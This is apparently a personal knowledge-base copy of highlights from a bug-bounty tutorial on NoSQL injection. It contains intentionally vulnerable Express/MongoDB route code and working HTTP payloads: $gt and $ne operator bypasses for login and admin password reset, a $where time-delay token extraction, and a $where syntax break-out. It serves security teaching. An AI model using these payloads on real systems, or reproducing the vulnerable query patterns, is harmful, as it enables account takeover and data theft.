---
author: blackbird-eu
aliases:
  - "NoSQLi: A Complete Guide to Exploiting Advanced NoSQL Injection Vulnerabilities"
tags:
  - readwise/articles
url: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities?__readwiseLocation=
date: 2025-04-28
summary: NoSQL injections are relatively easier to exploit than classic SQL injections. However, developers often overlook these vulnerabilities, mainly due to limited awareness. Additionally, false beliefs among software engineers that NoSQL databases inherently resist injection attacks further increase the likelihood of discovering NoSQLi vulnerabilities.In this article, we will diveâ€¦
---
# NoSQLi: A Complete Guide to Exploiting Advanced NoSQL Injection Vulnerabilities

In this article, we will dive deeper into identifying and exploiting advanced [NoSQL Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/NoSQL%20Injection.md). [](https://read.readwise.io/read/01jsxkq4fax6ktfsm71qpj8psy)

A few examples of [NoSQL](../../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/NoSQL%20101.md) databases include:
- MongoDB, a popular open-source NoSQL database supported
- Redis, an in-memory key-value store often used for caching data
- Elasticsearch, a commonly used NoSQL database for at-scale and complex search operations
- Apache CouchDB, a popular open-source NoSQL database with native REST HTTP API support
- Cloudflare KV or Amazon DynamoDB, both well-known serverless key-value storage options [](https://read.readwise.io/read/01jsxksn8tbsqsf1c506nrrykq)

## What are NoSQL injection vulnerabilities?

Similar to classic [SQL Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md), [NoSQL Injections](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/NoSQL%20Injection.md) stem from direct concatenation of unsanitized user input into a database query. This can allow an attacker to break out of the context and manipulate the query. [](https://read.readwise.io/read/01jsxkt7yvbzj6k4av85rn29t0)

The equivalent database query to authenticate a customer would look like this: [](https://read.readwise.io/read/01jsxkwq2a90ss049py5erpb5s)
```js
db.customers.findOne({ customer_email: 'customer@example.com', password: 'hunter2' }) 
```

NoSQL databases provide support for operators [^1], such as `$gt`, which help us filter fields by looking for values **greater than** the provided value.
Returning to our example, if our input is not sanitized, we could send the following HTTP POST request [](https://read.readwise.io/read/01jsxkx8xsmwfgpbm3a0pqc8yf)

```http
POST /customer_zone/sign_in HTTP/2.0
Host: example.com
Content-Type: application/json
User-Agent: ...

{
    "customer_email": "customer@example.com",
    "password": { "$gt": "" }
}
```

## Identifying NoSQL injection vulnerabilities

To identify a potential injection point, you need to break out the current syntax or inject an operator and observe any response changes, such as noticeable differences in content length, status code, or response headers.
Examine every input field and systematically inject different types of syntax-breaking characters, such as: [](https://read.readwise.io/read/01jsxky4pbw90zk45hjdv068e1)
```
$
{
}
\
"
`
;
%00 
```

## Exploiting simple NoSQL injections

One way to test for and exploit NoSQL injections is to break out of the syntax and inject our own logic to manipulate a query. [](https://read.readwise.io/read/01jsxm77hhvmcf1cqz3ata302r)

### Authentication bypass via operator injection

```js
// Application route handling password reset
app.post('/auth/reset-password', async (req, res) => {
  const { email, resetToken, newPassword } = req.body;
  
  try {
    const token = await db.collection('auth-tokens').findOne({
      email: email,
      resetPasswordToken: resetToken,
      resetPasswordExpires: { $gt: Date.now() }
    });
    
    if (!token) {
      return res.status(400).json({ message: 'Password reset token is invalid or has expired' });
    }
    
    // Update user's password
    await db.collection('users').updateOne({ email: email },
      { $set: {
          password: await bcrypt.hash(newPassword, 10)
      }    
    });
    
    res.json({ message: 'Password has been reset' });
  } catch (error) {
    console.error('Error during password reset:', error);
    res.status(500).json({ message: 'Server error' });
  }
});
```

Notice how our password reset token is concatenated **directly** into the MongoDB query. We can make use of an operator that manipulates the query to make it truthful. [](https://read.readwise.io/read/01jsxm8mhrrttjm0rda7gndb71)

```http
POST /auth/reset-password HTTP/2
Host: app.example.com
Content-Type: application/json; charset=utf-8
User-Agent: ...

{
    "email": "admin@example.com",
    "token": {"$ne": null},
    "newPassword": "hunter2"
}
```

In our payload, we used `$ne`, an operator that selects documents where the value is not equal to the specified value [](https://read.readwise.io/read/01jsxmb45gx3hwmedtz3jtgx1t).

#### MongoDB Operators
MongoDB supports several other operators:
- `$regex`: Selects documents where values match a specified regular expression
- `$where`: Matches documents that satisfy a JavaScript expression
- `$exists`: Matches documents that have the specified field
- `$eq`: Matches values that are equal to a specified value
- `$ne`: Matches values that are not equal to a specified value
- `$gt`: Matches values that are greater than a specified value [](https://read.readwise.io/read/01jsxmbcsza1474m070gfpqvpc)

>[!tip]
>If your application handles all request body data in form-data, you can make use of parameter arrays instead. [](https://read.readwise.io/read/01jsxmbrxevqhxa63qpntjdmve) [](https://read.readwise.io/read/01jsxmbyaw4ng5y3gm6zdntc9b)

```http
POST /auth/reset-password HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: ...

email=admin@example.com&token[$ne]=null&newPassword=hunter2
```


## Exploiting advanced NoSQL injections

### Extracting data with time delays

We can also exfiltrate data from fields by invoking a conditional time delay. [](https://read.readwise.io/read/01jsxmcg8qc65ccqx3dbxp2m2s)
```http
POST /auth/reset-password HTTP/2
Host: app.example.com
Content-Type: application/json; charset=utf-8
User-Agent: ...

{
  "email": "admin@example.com",
  "token": {
      "$where": "if(this.token.startsWith('a')) {sleep(5000); return true;} else {return true;}"
  },
  "password": "hunter2"
}
```

### Executing server-side JavaScript code with NoSQL syntax injection

Throughout this article, we've mentioned that server-side JavaScript code execution is possible using the `$where` operator in MongoDB. Other NoSQL databases provide similar functionality to help developers create more advanced query filters. [](https://read.readwise.io/read/01jsxmdevewm5hr2t5vq5fv2bh)

If our unsanitised input ever lands in a **$where** clause, we can break out of the syntax and execute arbitrary JavaScript code to make changes or exfiltrate other fields. [](https://read.readwise.io/read/01jsxme3dta6gqygjwkccjthg6)


```js
// Application route handling email unsubscribes
app.post('/newsletter/unsubscribe', async (req, res) => {
  const { email, unsubscribeToken } = req.body;
  
  try {
    const subscriber = await db.collection('subscribers').findOne({
      $where: 'this.email == ' + email + ' && this.unsubscribeToken == ' + unsubscribeToken
    });
    
    if (subscriber) {
      // Update the subscriber's preferences
      await db.collection('subscribers').updateOne(
        { email: email },
        { $set: { subscribed: false } }
      );
      
      res.json({ success: true, message: 'Successfully unsubscribed from all communication channels!' });
    } else {
      res.status(401).json({ success: false, message: 'Invalid email or token' });
    }
  } catch (error) {
    console.error('Unsubscribe error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});
```


```http
POST /newsletter/unsubscribe HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
User-Agent: ...

email=user@example.com'+||+TRUE;//&token=
```

This is possible because the payload matches all emails and removes the requirement of a token:
`this.email == 'user@example.com' || TRUE; // && this.unsubscribeToken == `
[](https://read.readwise.io/read/01jsxmewfa608gferptxmyeds9)

[^1]: [Operator Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/NoSQL%20Injection.md#Operator%20Injection)
